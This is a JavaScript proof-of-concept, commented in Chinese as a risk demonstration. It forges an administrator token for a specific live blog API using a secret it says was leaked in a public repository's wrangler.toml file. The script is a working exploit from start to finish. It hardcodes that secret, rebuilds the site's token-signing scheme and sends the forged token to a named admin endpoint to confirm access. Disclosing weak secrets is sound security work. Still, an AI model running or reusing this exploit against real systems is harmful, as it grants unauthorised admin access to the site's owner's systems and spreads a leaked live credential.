// 安全验证：仅用公开仓库里的信息，尝试伪造管理员 token
// 目的是证明风险，不修改任何数据（只调用只读的 stats 接口）
const LEAKED_SECRET = 'sjz-blog-2024-secret-key-x9k2m7p4q1'; // 公开仓库 api/wrangler.toml 里的值
const enc = new TextEncoder();

async function forge(userId) {
    const timestamp = Math.floor(Date.now() / 1000);
    const random = Math.random().toString(36).substring(7);
    const payload = userId + ':' + timestamp + ':' + random;
    const buf = await crypto.subtle.digest('SHA-256', enc.encode(payload + LEAKED_SECRET));
    const hash = Array.from(new Uint8Array(buf))
        .map((b) => b.toString(16).padStart(2, '0'))
        .join('');
    return payload + ':' + hash.substring(0, 16);
}

const token = await forge(1);
console.log('伪造的 token（前 44 字符）：' + token.slice(0, 44) + '…');

const res = await fetch('https://api.jacksjz.qzz.io/api/admin/stats', {
    headers: { Authorization: 'Bearer ' + token },
});
console.log('GET /api/admin/stats -> HTTP ' + res.status);
const body = await res.text();
console.log('返回：' + body.slice(0, 200));

if (res.status === 200) {
    console.log('\n结论：伪造成功 —— 任何人只要读到公开仓库里的 JWT_SECRET，就能拿到管理员权限。');
    process.exitCode = 0;
} else {
    console.log('\n结论：伪造失败（说明密钥已换或机制已改）。');
    process.exitCode = 1;
}
